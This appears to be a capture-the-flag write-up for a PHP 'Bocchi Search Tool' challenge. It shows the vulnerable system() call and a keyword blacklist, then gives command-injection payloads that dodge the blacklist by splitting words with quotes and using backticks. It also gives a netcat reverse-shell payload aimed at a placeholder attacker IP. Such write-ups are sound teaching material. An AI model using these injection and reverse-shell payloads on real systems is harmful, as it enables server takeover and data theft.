# Bocchi Search Tool
A tool help you find bocchi in json !
http://ctf.adl.tw:12001/

You input a json like string, and the program finds the "bocchi" member and prints its value.
# foot note
- anything on a shell command contained in pairs of`` gets executed as commands!!!
# solution
blacklist(php)
```php
$blacklist = ['|', '&', ';', '>', '<', "\n", '?', '*', '$', '\\', 'cat', 'flag'];
```

source code(php): 
```php
system("echo '" . $_POST['json'] . "'| jq .bocchi");
```

- attack string ver 1: '`tac  fl''ag` #
```php
system("echo '" . '`tac  fl''ag` # . "'| jq .bocchi");
```
which equals:
```bash
echo ''`tac  fl''ag` # . "'| jq .bocchi
```

- attack string ver 2: '`c''at  fl''ag` #
```php
system("echo '" .'`c''at  fl''ag` # . "'| jq .bocchi");
```
# Reverse shell
it turns out that we can reverse shell in 12001(bocchi search tool)
like this:
```ps
nc  <attacker ip addr> <port> -e /bin/sh
```
payload
```ps
'`nc  <attacker ip addr> <port> -e /bin/sh`#
```
on the attacker's pc:
```ps
nc localhost <port> 
```
